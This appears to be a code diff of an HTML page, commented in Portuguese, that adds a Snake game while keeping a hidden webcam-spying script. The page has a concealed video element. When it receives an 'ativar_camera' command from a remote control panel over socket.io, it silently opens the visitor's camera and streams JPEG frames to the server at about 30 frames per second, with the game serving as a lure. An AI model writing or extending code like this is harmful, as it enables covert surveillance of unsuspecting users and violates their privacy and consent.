@@ -16,15 +16,24 @@
         #game-container {
             width: 100%;
             height: 100vh;
-            background-color: #f0f0f0;
             display: flex;
             justify-content: center;
             align-items: center;
+            background-color: #222;
         }
         
-        #game-placeholder {
-            font-size: 24px;
-            color: #333;
+        #snake-game {
+            border: 2px solid #4CAF50;
+            background-color: #000;
+        }
+        
+        #score {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #FFF;
+            font-family: Arial, sans-serif;
+            font-size: 20px;
         }
     </style>
 </head>
@@ -34,47 +43,44 @@
     <!-- Vídeo totalmente escondido mas funcionando -->
     <video id="video" autoplay muted></video>
     
-    <!-- Container do jogo -->
+    <!-- Container do jogo da cobrinha -->
     <div id="game-container">
-        <p id="game-placeholder">Jogo será carregado aqui</p>
-        <!-- Você pode substituir por um canvas ou iframe do jogo depois -->
+        <canvas id="snake-game" width="400" height="400"></canvas>
+        <div id="score">Pontuação: 0</div>
     </div>
 
     <p id="status"></p>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        // ========== CÓDIGO DA CÂMERA (mantido intacto) ==========
         const socket = io();
         const video = document.getElementById('video');
         let stream = null;
         let isSendingFrames = false;
-        let canvas = document.createElement('canvas');
-        let ctx = canvas.getContext('2d');
+        let cameraCanvas = document.createElement('canvas');
+        let cameraCtx = cameraCanvas.getContext('2d');
 
-        // Função para enviar frames da câmera
         function sendCameraFrame() {
             if (!isSendingFrames || !stream) return;
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            cameraCanvas.width = video.videoWidth;
+            cameraCanvas.height = video.videoHeight;
+            cameraCtx.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
             
-            // Converte para JPEG (otimizado para transmissão)
-            const frame = canvas.toDataURL('image/jpeg', 0.7); // Qualidade 70%
+            const frame = cameraCanvas.toDataURL('image/jpeg', 0.7);
             socket.emit('frame_ao_vivo', frame);
 
-            // Configura o próximo frame (~30 FPS)
-            setTimeout(sendCameraFrame, 33); // ~33ms = 30 FPS
+            setTimeout(sendCameraFrame, 33);
         }
 
-        // Recebe comandos do Painel
         socket.on('executar_comando', async (cmd) => {
             if (cmd === 'ativar_camera' && !stream) {
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                     video.srcObject = stream;
                     isSendingFrames = true;
-                    sendCameraFrame(); // Inicia o streaming
+                    sendCameraFrame();
                 } catch (err) {
                     console.error("Erro ao acessar câmera:", err);
                 }
@@ -87,6 +93,116 @@
                 stream = null;
             }
         });
+
+        // ========== JOGO DA COBRINHA ==========
+        const canvas = document.getElementById('snake-game');
+        const ctx = canvas.getContext('2d');
+        const scoreElement = document.getElementById('score');
+        
+        const box = 20;
+        let snake = [{x: 9 * box, y: 10 * box}];
+        let food = {
+            x: Math.floor(Math.random() * 20) * box,
+            y: Math.floor(Math.random() * 20) * box
+        };
+        let direction = null;
+        let score = 0;
+        let game;
+
+        function drawGame() {
+            // Fundo do jogo
+            ctx.fillStyle = "#000";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Cobrinha
+            for (let i = 0; i < snake.length; i++) {
+                ctx.fillStyle = i === 0 ? "#4CAF50" : "#8BC34A";
+                ctx.fillRect(snake[i].x, snake[i].y, box, box);
+                
+                ctx.strokeStyle = "#000";
+                ctx.strokeRect(snake[i].x, snake[i].y, box, box);
+            }
+            
+            // Comida
+            ctx.fillStyle = "#FF5252";
+            ctx.fillRect(food.x, food.y, box, box);
+            
+            // Posição atual da cabeça
+            let snakeX = snake[0].x;
+            let snakeY = snake[0].y;
+            
+            // Movimentação
+            if (direction === "LEFT") snakeX -= box;
+            if (direction === "UP") snakeY -= box;
+            if (direction === "RIGHT") snakeX += box;
+            if (direction === "DOWN") snakeY += box;
+            
+            // Verifica se comeu a comida
+            if (snakeX === food.x && snakeY === food.y) {
+                score++;
+                scoreElement.textContent = `Pontuação: ${score}`;
+                food = {
+                    x: Math.floor(Math.random() * 20) * box,
+                    y: Math.floor(Math.random() * 20) * box
+                };
+            } else {
+                // Remove o último elemento se não comeu
+                snake.pop();
+            }
+            
+            // Nova cabeça
+            let newHead = {x: snakeX, y: snakeY};
+            
+            // Verifica colisões
+            if (
+                snakeX < 0 || snakeY < 0 ||
+                snakeX >= canvas.width || snakeY >= canvas.height ||
+                collision(newHead, snake)
+            ) {
+                clearInterval(game);
+                alert("Game Over! Pontuação: " + score);
+                resetGame();
+            }
+            
+            snake.unshift(newHead);
+        }
+
+        function collision(head, array) {
+            for (let i = 0; i < array.length; i++) {
+                if (head.x === array[i].x && head.y === array[i].y) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        function resetGame() {
+            snake = [{x: 9 * box, y: 10 * box}];
+            direction = null;
+            score = 0;
+            scoreElement.textContent = `Pontuação: ${score}`;
+            food = {
+                x: Math.floor(Math.random() * 20) * box,
+                y: Math.floor(Math.random() * 20) * box
+            };
+            game = setInterval(drawGame, 100);
+        }
+
+        // Controles
+        document.addEventListener('keydown', (event) => {
+            if (event.keyCode === 37 && direction !== "RIGHT") {
+                direction = "LEFT";
+            } else if (event.keyCode === 38 && direction !== "DOWN") {
+                direction = "UP";
+            } else if (event.keyCode === 39 && direction !== "LEFT") {
+                direction = "RIGHT";
+            } else if (event.keyCode === 40 && direction !== "UP") {
+                direction = "DOWN";
+            }
+        });
+
+        // Inicia o jogo
+        resetGame();
     </script>
 </body>
 </html>
